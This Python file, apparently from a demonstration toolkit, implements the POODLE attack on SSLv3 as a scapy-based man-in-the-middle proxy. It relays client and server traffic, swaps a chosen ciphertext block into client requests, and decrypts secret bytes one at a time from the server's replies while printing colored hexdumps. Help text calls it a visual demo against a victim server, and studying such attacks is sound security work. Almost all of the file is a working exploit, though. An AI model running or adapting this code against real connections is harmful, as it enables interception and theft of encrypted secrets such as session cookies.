import scapy.route
from scapy.config import conf
from scapy.supersocket import StreamSocket
from scapy.sendrecv import sniff, send, bridge_and_sniff
from scapy.layers.inet import IP, TCP
from scapy.packet import Raw
#from ssl_demos.common.packets import *
from scapy_ssl_tls.ssl_tls import TLSRecord, TLSClientHello, TLSServerHello, TLSCiphertext, TLSAlert, SSL, TLSPlaintext, TLSContentType
from scapy_ssl_tls.ssl_tls_crypto import TLSContext, TLSSessionCtx
import threading
from select import select
import socket
import logging

from helperlib import print_hexdump


log = logging.getLogger(__name__)


class PoodlePlugin:
    def __init__(self, core):
        self.core = core
        self.stop_event = threading.Event()
        self.client_thread = None
        self.server_thread = None

    @classmethod
    def add_arguments(cls, parser):
        def hexordec(val):
            try:
                return int(val)
            except:
                try:
                    return int(val, 16)
                except ValueError as e:
                    import argparse
                    raise argparse.ArgumentTypeError(str(e))
        
        parser.add_argument('-I2', '--intf2', default='lo', help='2nd interface for the MitM')
        parser.add_argument('-t', '--target', help='Target secret to recover (for visual demo only)')
        parser.add_argument('-bo', '--block-offset', type=hexordec, default=0xA0, help='Offset to the crypt block to decrypt')
        parser.add_argument('-pk', '--private-key', default='victim_server/privkey.pem', help='Private key used by the serveer (for visual demo only)')
    
    def start(self):
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind(('', self.core.port))
        server.listen()

        DEBUG = log.isEnabledFor(logging.DEBUG)

        def info(*args, **kwargs):
            if not log.isEnabledFor(logging.INFO):
                return
            args = tuple(map(self.core._color, args))
            print(*args, **kwargs)

        decrypted = ''
        while True:
            s1 = StreamSocket(server.accept()[0], SSL)
            log.info('Connecting to %s:%d', self.core.ip, self.core.port)
            s2 = StreamSocket(socket.create_connection((self.core.ip, self.core.port)), SSL)

            peerof = {s1:s2, s2:s1}
            label = {s1: 'client', s2: 'server'}

            stop = False
            ctx = TLSSessionCtx('foo')
            ctx.server_ctx.load_rsa_keys_from_file(self.core.private_key)
            client_request = None
            block_offset = self.core.block_offset
            try:
                while not stop:
                    ins, outs, errs = select([s1, s2], [], [], None)
                    for s in ins:
                        info("\033[97m>", label[s], "\033[0m")
                        p = s.recv()
                        if p is None or len(p) == 0:
                            stop = True
                            break

                        if p.haslayer(TLSServerHello):
                            ctx.printed = False
                            ctx.master_secret = None
                            ctx.match_server = s
                        elif p.haslayer(TLSClientHello):
                            ctx.match_client = s
                        ctx.insert(p)
                        # p.show()

                        cipherdata = []
                        plaindata = []
                        for record in p.records:
                            if record.haslayer(TLSRecord) and record[TLSRecord].content_type == TLSContentType.HANDSHAKE:
                                continue

                            if record.haslayer(TLSCiphertext):
                                cipherdata.append((record, record[TLSCiphertext].data))
                                # print("\033[91mCiphertext\033[0m")
                                # print_hexdump(record[TLSCiphertext].data, colored=True, cols=ctx.sec_params.block_size)


                        if p.haslayer(TLSCiphertext) or (p.haslayer(TLSAlert) and p.haslayer(Raw)):

                            # if ctx.master_secret and not ctx.printed:
                            #     print(ctx)
                            #     ctx.printed = True

                            if s == ctx.match_client:
                                ctx.set_mode(server=True)
                            elif s == ctx.match_server:
                                ctx.set_mode(client=True)

                            if DEBUG:
                                ssl = SSL(bytes(p), ctx=ctx)
                                for record in ssl.records:
                                    if record.haslayer(TLSPlaintext):
                                        plaintext = record[TLSPlaintext]
                                        data = plaintext.data + plaintext.mac + plaintext.padding + bytes([plaintext.padding_len])
                                        plaindata.append(data)
                            else:
                                plaindata = [b''] * len(cipherdata)

                        if ctx.sec_params is not None:
                            mac_length = ctx.sec_params.mac_key_length
                            mac_length += ctx.sec_params.block_size - (mac_length % ctx.sec_params.block_size)

                        for (record, cipher), plain in zip(cipherdata, plaindata):
                            if len(cipher) > mac_length:
                                if label[s] == 'client':
                                    info("\033[94mProbably Request ({} > {})\033[0m".format(len(cipher), mac_length))
                                    client_request = cipher
                                elif label[s] == 'server':
                                    info("\033[94mProbably Response ({} > {})\033[0m".format(len(cipher), mac_length))
                            info("\033[91mCiphertext\033[0m")
                            print_hexdump(cipher, colored=True, cols=ctx.sec_params.block_size, bright=self.core.bright)
                            if DEBUG:
                                info("\033[92mPlaintext\033[0m")
                                print_hexdump(
                                    plain, colored=True, cols=ctx.sec_params.block_size, bright=self.core.bright)

                            if len(cipher) > mac_length:
                                if label[s] == 'client':
                                    secret_block = cipher[block_offset:block_offset + ctx.sec_params.block_size]
                                    cipher = cipher[:-ctx.sec_params.block_size] + secret_block
                                    record[TLSCiphertext].data = cipher
                                    info("\033[91mCiphertext new\033[0m")
                                    print_hexdump(
                                        cipher, colored=True, cols=ctx.sec_params.block_size, bright=self.core.bright)
                                    # p.show()
                                elif label[s] == 'server':
                                    a = client_request[-ctx.sec_params.block_size - 1]
                                    b = client_request[block_offset - 1]
                                    im = a ^ (ctx.sec_params.block_size - 1)
                                    ch = b ^ im
                                    decrypted = chr(ch) + decrypted
                                    info("Decrypted: '{}' (0x{:02x} = 0x{:02x}^0x{:02x}^0x{:02x})".format(
                                        decrypted,
                                        ch,
                                        a,
                                        ctx.sec_params.block_size - 1,
                                        b
                                    ))
                                    input('Enter to continue')


                        s = peerof[s]
                        s.send(p)
            except OSError:
                pass
